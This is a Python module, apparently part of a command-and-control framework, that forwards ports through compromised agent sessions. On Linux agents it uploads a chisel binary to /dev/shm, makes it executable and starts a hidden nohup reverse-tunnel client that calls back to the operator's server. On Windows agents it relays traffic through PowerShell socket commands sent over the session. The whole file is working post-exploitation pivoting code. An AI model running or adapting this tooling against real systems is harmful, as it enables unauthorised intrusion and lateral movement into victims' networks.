# core/portfwd.py

import socket
import threading
import base64
import os
import subprocess
from core import shell
from core.session_handlers import session_manager
from core.utils import register_forward, unregister_forward
from colorama import init, Fore, Style

brightgreen  = "\001" + Style.BRIGHT + Fore.GREEN  + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred    = "\001" + Style.BRIGHT + Fore.RED    + "\002"

def portfwd_listener(rule_id, sid,
                     local_host, local_port,
                     remote_host, remote_port,
                     chisel_port):
    """
    If Windows or HTTP, do our normal socket‐based pump.
    If Linux, upload chisel, start a local chisel server + agent client,
    then exit (chisel will do the forwarding, so we do NOT bind in Python).
    """
    session = session_manager.sessions.get(sid)
    if not session:
        print(brightred + f"[!] No such session {sid}")
        return

    transport = getattr(session, "transport", None)
    if transport not in ("tcp", "http", "tls", "https"):
        print(brightred + f"[!] Session {sid} transport '{transport}' not supported")
        return

    is_windows = "windows" in session.metadata.get("os","").lower()
    lock = threading.Lock()

    def exec_cmd(cmd_str):
        """Send cmd_str to the agent and return decoded stdout."""
        if transport in ("tcp", "tls"):
            with lock:
                return shell.run_command_tcp(sid, cmd_str, timeout=0.5)
        else:
            b64 = base64.b64encode(cmd_str.encode()).decode()
            with lock:
                session.command_queue.put(b64)
                out_b64 = session.output_queue.get()
            return base64.b64decode(out_b64).decode("utf-8", "ignore")

    # --- Linux / chisel branch ---
    if not is_windows:
        # 1) upload chisel binary to agent
        local_chisel  = "core/binaries/chisel"
        remote_chisel = "/dev/shm/chisel"

        if transport == "http":
            shell.upload_file_http(sid, local_chisel, remote_chisel)

        elif transport in ("tcp", "tls"):
            shell.upload_file_tcp(sid, local_chisel, remote_chisel)

        else:
            print(brightred + f"[-] ERROR unsupported session type!")

        # 2) make it executable
        exec_cmd(f"chmod +x {remote_chisel}")

        # 3) start chisel server locally (on your C2 box)
        #    so agent can reverse‐connect back.
        subprocess.Popen(
            [local_chisel, "server", "--reverse", "--port", str(chisel_port)],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL
        )
        print(brightyellow +
              f"[*] Started local chisel server on port {chisel_port}")

        # 4) start chisel client on the agent, reverse‐forwarding:
        #      R:<local_port>:<remote_host>:<remote_port>
        exec_cmd(
            f"nohup {remote_chisel} client "
            f"{local_host}:{chisel_port} "
            f"R:{local_port}:{remote_host}:{remote_port} "
            f"> /dev/null 2>&1 &"
        )
        print(brightgreen +
              f"[+] Agent chisel client → R:{local_port}→{remote_host}:{remote_port}")

        # done! chisel itself listens on local_host:local_port,
        # so we do NOT bind in Python here.
        return

    # --- Windows or raw‐TCP/HTTP fallback: do the old socket‐pump loop ---
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((local_host, local_port))
    listener.listen(5)

    register_forward(
        rule_id, sid, local_host, local_port,
        remote_host, remote_port,
        threading.current_thread(), listener
    )
    print(brightgreen +
          f"[+] Forward #{rule_id} {local_host}:{local_port} → "
          f"{remote_host}:{remote_port} ({transport})")

    def send_chunk(data: bytes):
        b64 = base64.b64encode(data).decode()
        if is_windows:
            inner = (
                f"$global:pfS{rule_id}.Write("
                f"[Convert]::FromBase64String('{b64}'),0,"
                f"[Convert]::FromBase64String('{b64}').Length)"
            )
        else:
            inner = f"bash -c 'echo {b64} | base64 -d >&3'"
        wrapper = (
            f"echo PFWD-{rule_id}-BEGIN; {inner}; echo PFWD-{rule_id}-END"
        )
        exec_cmd(wrapper)

    def read_chunk() -> bytes:
        if is_windows:
            inner = (
                f"$buf=New-Object byte[] 262144;"
                f"$cnt=$global:pfS{rule_id}.Read($buf,0,$buf.Length);"
                f"Write-Output ([Convert]::ToBase64String($buf,0,$cnt))"
            )
        else:
            inner = "bash -c 'head -c 4096 <&3 | base64'"
        wrapper = (
            f"echo PFWD-{rule_id}-BEGIN; {inner}; echo PFWD-{rule_id}-END"
        )
        raw = exec_cmd(wrapper)
        lines, out, collecting = raw.splitlines(), [], False
        for L in lines:
            if f"PFWD-{rule_id}-BEGIN" in L:
                collecting = True; continue
            if f"PFWD-{rule_id}-END" in L:
                break
            if collecting:
                out.append(L.strip())
        return base64.b64decode("".join(out)) if out else b""

    def cleanup_socket():
        if is_windows:
            cmd = (
                f"$global:pfC{rule_id}.Close(); "
                f"Remove-Variable pfC{rule_id},pfS{rule_id}"
            )
            exec_cmd(cmd)

    def handle_tcp(client_sock):
        # open remote socket on agent
        setup = (
            f"$global:pfC{rule_id}=New-Object Net.Sockets.TcpClient"
            f"('{remote_host}',{remote_port});"
            f"$global:pfS{rule_id}=$global:pfC{rule_id}.GetStream();"
            f"Write-Output 'PFWD-READY'"
        )
        out = exec_cmd(setup)
        if "PFWD-READY" not in out:
            print(brightred + f"[!] setup failed for #{rule_id}")
            client_sock.close()
            return

        t1 = threading.Thread(
            target=lambda: pump_loop(client_sock, send_chunk),
            daemon=True
        )
        t2 = threading.Thread(
            target=lambda: pump_loop(read_chunk, client_sock.sendall),
            daemon=True
        )
        t1.start(); t2.start()
        t1.join(); t2.join()

        cleanup_socket()
        client_sock.close()

    def handle_http(client_sock):
        # identical logic, just use exec_cmd(...) instead of shell.run_command_tcp
        handle_tcp(client_sock)

    def pump_loop(src, dst):
        try:
            while True:
                data = src.recv(262144) if hasattr(src, "recv") else src()
                if not data:
                    break
                dst(data)
        except:
            pass

    try:
        while True:
            client, _ = listener.accept()
            handler = handle_tcp if transport in ("tcp", "tls") else handle_http
            threading.Thread(
                target=handler,
                args=(client,),
                daemon=True
            ).start()
    finally:
        listener.close()
        unregister_forward(rule_id)
